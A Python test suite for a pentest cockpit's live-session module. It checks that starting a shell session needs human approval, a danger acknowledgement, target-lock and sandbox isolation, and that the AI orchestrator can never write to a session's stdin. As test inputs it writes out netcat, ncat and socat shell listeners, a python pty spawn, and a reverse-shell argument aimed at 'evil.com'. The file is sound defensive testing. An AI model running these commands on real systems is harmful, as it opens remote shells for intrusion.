"""Live-session containment regression-lock (cockpit/session.py).

A session is a long-lived, already-approved, already-running process with an OPEN
STDIN. That makes it the highest-leverage thing in the cockpit, so two invariants carry
the whole safety model and these tests fail loudly if either is weakened:

  1. STARTING a session is a GATED COMMAND. start() must go through the REAL executor
     gates — approve-each + the heuristic red-confirm + the mode gate, argv-only. A
     listener (nc/socat/interpreter) trips the heuristic, so dangerous_ack is required.
     An unapproved, unacked, or off-target start runs NOTHING.

  2. A LIVE SESSION'S STDIN IS *** HUMAN-ONLY ***. write_stdin may be referenced ONLY by
     session.py (defines it) + cockpit/router.py (the HTTP route a human's UI drives).
     The orchestrator / agent / loop / executor / adgraph must have ZERO code path to
     it. This is the same rule :kali has, scanned the same way — and it matters more
     here: :kali needs a human to type each command, and so must a live session. The
     loop may PROPOSE starting a session (a gated command a human approves); it may
     NEVER type into one.

Also locked: the sandbox comes from the MODE (never a request field), containment is
whatever the start mode gives it (lab isolation / engagement scope-lock), the argv is
argv-only, and the transcript is recorded against the engagement.

Hermetic: subprocess.Popen, the isolation gate and runstore.save_run are monkeypatched,
so no Docker daemon and no real DB writes. Run:  python test_session.py
"""
from __future__ import annotations

import re
import threading
from pathlib import Path

from cockpit import config
from cockpit import executor as EX
from cockpit import session as S
from cockpit.session import SessionRefused, SessionStartRequest

BACKEND = Path(__file__).parent


class _FakeProc:
    """A stand-in for the docker exec client — records what was written to stdin."""

    def __init__(self, argv):
        self.argv = argv
        self.written: list[str] = []
        self._alive = True
        # A session is LONG-LIVED: wait() must block until killed, like the real client.
        self._done = threading.Event()
        outer = self

        class _In:
            closed = False

            def write(self, s):
                outer.written.append(s)

            def flush(self):
                pass

            def close(self):
                self.closed = True

        class _Out:
            def readline(self):
                return ""  # EOF immediately: no output pump churn in tests

            def close(self):
                pass

        self.stdin = _In()
        self.stdout = _Out()
        self.stderr = _Out()

    def wait(self):
        self._done.wait()
        return 0

    def poll(self):
        return None if self._alive else 0

    def kill(self):
        self._alive = False
        self._done.set()


class _Spy:
    """Swaps Popen, the isolation gate and save_run for fakes; restores on exit."""

    def __init__(self, *, isolated=True, docker_missing=False):
        self.isolated = isolated
        self.docker_missing = docker_missing
        self.procs: list[_FakeProc] = []
        self.saved: list = []
        self._orig = (S.subprocess.Popen, EX.assert_isolation_proven, S.runstore.save_run)

    def __enter__(self):
        def fake_popen(argv, **kw):
            if self.docker_missing:
                raise FileNotFoundError("docker")
            p = _FakeProc(argv)
            self.procs.append(p)
            return p

        def fake_isolation():
            if not self.isolated:
                from cockpit.sandbox import SandboxError

                raise SandboxError("sandbox is attached to non-internal network(s)")

        S.subprocess.Popen = fake_popen
        EX.assert_isolation_proven = fake_isolation
        S.runstore.save_run = lambda rec: self.saved.append(rec)
        return self

    def __exit__(self, *exc):
        S.subprocess.Popen, EX.assert_isolation_proven, S.runstore.save_run = self._orig
        # Don't leak fake sessions into the next test.
        with S._registry_lock:
            S._sessions.clear()
        return False


def _req(**over):
    base = dict(
        command="nc",
        args=["-lvnp", "4444"],
        target=config.LAB_TARGET_HOST,
        approved=True,
        dangerous_ack=True,
    )
    base.update(over)
    return SessionStartRequest(**base)


# --------------------------------------------------------------------------- #
# 1. STARTING a session is a GATED COMMAND.
# --------------------------------------------------------------------------- #


def test_start_requires_approval() -> None:
    """No approval -> nothing starts. There is no autonomous/approve-all path."""
    with _Spy() as spy:
        rejected = S.validate_start(_req(approved=False))
        assert rejected is not None and rejected.gate == "approval", rejected
        raised = False
        try:
            S.start(_req(approved=False))
        except SessionRefused as exc:
            raised = True
            assert exc.gate == "approval"
        assert raised, "an unapproved session start MUST refuse"
        assert not spy.procs, "a refused start MUST NOT spawn a process"
        assert not spy.saved, "a refused start MUST NOT be recorded"
    print("  start requires per-command human approval: PASS")


def test_start_trips_the_danger_heuristic() -> None:
    """A listener/handler is exactly what the heuristic flags — it needs dangerous_ack.

    This is the point: you cannot start a shell-catcher by accident, and neither can an
    agent-proposed command sneak one through on a plain approval."""
    for cmd, args in [
        ("nc", ["-lvnp", "4444"]),
        ("ncat", ["-l", "-p", "4444", "-e", "/bin/sh"]),
        ("socat", ["TCP-LISTEN:4444,reuseaddr", "EXEC:/bin/sh"]),
        ("python3", ["-c", "import pty"]),
    ]:
        rejected = S.validate_start(_req(command=cmd, args=args, dangerous_ack=False))
        assert rejected is not None and rejected.gate == "danger", (
            f"{cmd} must require an explicit dangerous_ack, got {rejected}"
        )
        assert rejected.dangerous_flags, "the confirm must name why it was flagged"
        # With the ack it clears the danger gate.
        assert S.validate_start(_req(command=cmd, args=args)) is None, (
            f"{cmd} must start once explicitly acked"
        )

    # A dotted payload (`pty.spawn(...)`) is host-shaped to the best-effort target-lock,
    # so it is refused EARLIER, at the target gate. That is pre-existing executor
    # behaviour shared with one-shot commands (gate order: target -> approval -> danger)
    # and it fails CLOSED, so it is recorded here rather than worked around.
    rejected = S.validate_start(_req(command="python3", args=["-c", "import pty; pty.spawn('/bin/sh')"]))
    assert rejected is not None and rejected.gate == "target", (
        f"a dotted payload must fail closed at the target-lock, got {rejected}"
    )
    print("  start trips the heuristic red-confirm (nc/ncat/socat/interpreter): PASS")


def test_start_is_target_locked() -> None:
    """The DECLARED bind target is validated by the mode's real target-lock, and a bad
    host in the REAL args is still rejected even when the declared target is the lab."""
    rejected = S.validate_start(_req(target="evil.com"))
    assert rejected is not None and rejected.gate == "target", rejected
    assert "not the lab" in rejected.reason

    # The declared target cannot launder an off-lab host sitting in the argv.
    rejected = S.validate_start(_req(args=["-e", "/bin/sh", "evil.com", "4444"]))
    assert rejected is not None and rejected.gate == "target", (
        "a bad host in the args must still be rejected — the declared target is not a bypass"
    )
    print("  start is target-locked (declared target + args both checked): PASS")


def test_start_keeps_the_lab_isolation_gate() -> None:
    """LAB sessions still require a provably isolated sandbox — the lab's real bound."""
    with _Spy(isolated=False) as spy:
        rejected = S.validate_start(_req())
        assert rejected is not None and rejected.gate == "sandbox", rejected
        raised = False
        try:
            S.start(_req())
        except SessionRefused as exc:
            raised = True
            assert exc.gate == "sandbox"
        assert raised, "a non-isolated lab sandbox MUST refuse to host a session"
        assert not spy.procs, "nothing may spawn when isolation fails"
    print("  lab session keeps the isolation gate: PASS")


def test_sandbox_comes_from_mode_not_request() -> None:
    """No request field can redirect the exec (mirrors :kali containment rule #1)."""
    fields = set(SessionStartRequest.model_fields.keys())
    assert fields == {
        "command", "args", "target", "approved", "dangerous_ack",
        "engagement_id", "session_id", "step_id",
    }, f"unexpected SessionStartRequest fields {fields} — a container/sandbox field would break containment"
    assert "container" not in fields and "sandbox" not in fields

    with _Spy() as spy:
        # Even a command whose *string* names the open/engagement boxes execs into the lab one.
        S.start(_req(args=["-lvnp", "4444", "--x=hackpit-kali-open"], target=config.LAB_TARGET_HOST))
        argv = spy.procs[0].argv
        assert argv[:4] == ["docker", "exec", "-i", config.SANDBOX_CONTAINER], argv
        assert argv[3] != config.KALI_OPEN_CONTAINER, "a lab session must NOT reach the open box"
        assert argv[3] != config.ENGAGE_SANDBOX_CONTAINER, "a lab session must NOT reach engagement"
        # argv-only: never a shell, and the declared target is NOT appended to the argv.
        assert "sh" not in argv[3:5] and "-c" not in argv, "sessions are argv-only (no shell)"
        assert argv[4:] == ["nc", "-lvnp", "4444", "--x=hackpit-kali-open"], argv
    print("  sandbox comes from the MODE, argv-only, no container field: PASS")


# --------------------------------------------------------------------------- #
# 2. *** THE INVARIANT ***  — a live session's stdin is HUMAN-ONLY.
# --------------------------------------------------------------------------- #


def test_session_stdin_is_human_only() -> None:
    """write_stdin may be referenced ONLY by session.py + cockpit/router.py.

    THE LOAD-BEARING TEST. A live session is already approved and already running, so
    anything able to type into it is executing un-gated commands — that is exactly the
    autonomy the approve-each model exists to prevent. The orchestrator/agent/loop/
    executor/adgraph must have NO path here. Scans the whole (non-venv) source tree,
    by RELATIVE PATH so adgraph/router.py is not accidentally allowed alongside
    cockpit/router.py.
    """
    allowed = {Path("cockpit/session.py"), Path("cockpit/router.py")}
    # Import forms that would pull the live-session module in, plus the writer itself.
    # \bsession\b does not match `sessions` (backend/sessions.py, the engagement store).
    patterns = [
        r"\bwrite_stdin\b",
        r"\bfrom\s+\.session\b",
        r"\bfrom\s+cockpit\.session\b",
        r"\bimport\s+cockpit\.session\b",
        r"\bfrom\s+cockpit\s+import\s+[^\n]*\bsession\b",
        r"\bfrom\s+\.\s+import\s+[^\n]*\bsession\b",
        r"\bcockpit\.session\b",
    ]
    py_files = (
        list(BACKEND.glob("*.py"))
        + list((BACKEND / "cockpit").glob("*.py"))
        + list((BACKEND / "adgraph").glob("*.py"))
    )
    offenders: list[str] = []
    for f in py_files:
        rel = f.relative_to(BACKEND)
        if rel in allowed or f.name.startswith("test_"):
            continue
        text = f.read_text(encoding="utf-8")
        hits = [p for p in patterns if re.search(p, text)]
        if hits:
            offenders.append(f"{rel.as_posix()} ({', '.join(hits)})")
    assert not offenders, (
        "a live session's stdin must be HUMAN-ONLY — these modules can reach it: "
        f"{offenders}. The orchestrator/agent/executor must have NO path to session.write_stdin."
    )
    print("  session stdin is HUMAN-ONLY (no agent/loop/executor path): PASS")


def test_agent_path_modules_expose_no_session_hook() -> None:
    """Belt-and-suspenders: the autonomous path's modules carry no session attribute."""
    import orchestrator as O

    for mod, name in ((EX, "executor"), (O, "orchestrator")):
        for attr in ("write_stdin", "session", "start_session", "SessionStartRequest"):
            assert not hasattr(mod, attr), (
                f"{name} must not expose '{attr}' — that would be an agent path to a live session"
            )
    # The orchestrator source must not reach sessions either (it only proposes commands).
    src = Path(O.__file__).read_text(encoding="utf-8")
    for bad in ("write_stdin", "session_start", "cockpit.session", "from .session"):
        assert bad not in src, f"orchestrator must not reference '{bad}'"
    print("  executor/orchestrator expose no session hook: PASS")


def test_loop_may_propose_a_session_but_cannot_drive_one() -> None:
    """The loop's ONLY relationship to sessions is proposing a command a human approves.

    A proposal is inert data — it carries no session id, cannot start a session, and has
    no route to stdin. Starting is a human's gated action; typing is a human's action.
    """
    import orchestrator as O

    plan = {"goal": "g", "phases": [{"phase": "recon", "label": "R", "steps": []}]}
    resp = (
        '{"done": false, "command": "nc", "args": ["-lvnp", "4444", "hackpit-lab-target"], '
        '"rationale": "catch a shell"}'
    )
    orig = O.llm.chat
    try:
        O.llm.chat = lambda system, user, cfg, max_tokens=700: resp
        out = O.propose_next(plan, [], {}, [])
    finally:
        O.llm.chat = orig

    proposal = out["proposal"]
    assert proposal is not None, "the loop may legitimately propose a listener"
    # The proposal is INERT DATA: command/args/rationale + advisory gate info. It carries
    # no live-session id and no stdin payload, so there is nothing for it to drive.
    assert set(proposal) == {
        "command", "args", "rationale", "step_id", "gate_ok", "gate_reason", "dangerous_flags"
    }, f"a proposal must not gain session-driving fields, got {sorted(proposal)}"
    assert proposal["dangerous_flags"], "a proposed listener must still be flagged dangerous"
    # And proposing it starts NOTHING — the registry is untouched.
    with S._registry_lock:
        assert not S._sessions, "a proposal must never create a session"
    print("  loop may propose a session-start, never drive a live session: PASS")


def test_stdin_refuses_when_session_is_not_live() -> None:
    """Writing to a finished session refuses — stdin only ever reaches a LIVE process."""
    with _Spy():
        info = S.start(_req())
        S.kill(info.sid)
        raised = False
        try:
            S.write_stdin(info.sid, "whoami")
        except SessionRefused as exc:
            raised = True
            assert exc.gate == "state"
        assert raised, "a killed session MUST refuse further input"

        missing = False
        try:
            S.write_stdin("deadbeefdead", "whoami")
        except S.SessionNotFound:
            missing = True
        assert missing, "an unknown sid must not resolve to some other session"
    print("  stdin refuses on a finished/unknown session: PASS")


def test_stdin_is_recorded_as_human_input() -> None:
    """What a human typed is marked in the transcript, distinct from process output."""
    with _Spy() as spy:
        info = S.start(_req(session_id="eng-1"))
        S.write_stdin(info.sid, "whoami")
        proc = spy.procs[0]
        assert proc.written == ["whoami\n"], f"the line must reach stdin verbatim, got {proc.written}"
        rec = spy.saved[-1]
        assert rec.command == "session", "the record must name itself a session"
        assert rec.args == ["nc", "-lvnp", "4444"], "the record logs the argv that started it"
        assert rec.session_id == "eng-1", "the transcript attaches to the engagement"
        assert S.STDIN_MARK + "whoami" in rec.stdout, "human input must be marked in the transcript"
    print("  human input is recorded + marked in the transcript: PASS")


def test_stdin_write_is_capped() -> None:
    """A paste bomb is refused rather than shoved into a live process."""
    with _Spy() as spy:
        info = S.start(_req())
        raised = False
        try:
            S.write_stdin(info.sid, "A" * (S.STDIN_MAX_BYTES + 10))
        except SessionRefused as exc:
            raised = True
            assert exc.gate == "limit"
        assert raised, "an oversized write must refuse"
        assert spy.procs[0].written == [], "nothing may reach stdin when the cap refuses"
    print("  stdin write is capped: PASS")


if __name__ == "__main__":
    test_start_requires_approval()
    test_start_trips_the_danger_heuristic()
    test_start_is_target_locked()
    test_start_keeps_the_lab_isolation_gate()
    test_sandbox_comes_from_mode_not_request()
    test_session_stdin_is_human_only()
    test_agent_path_modules_expose_no_session_hook()
    test_loop_may_propose_a_session_but_cannot_drive_one()
    test_stdin_refuses_when_session_is_not_live()
    test_stdin_is_recorded_as_human_input()
    test_stdin_write_is_capped()
    print("ALL live-session containment tests pass")
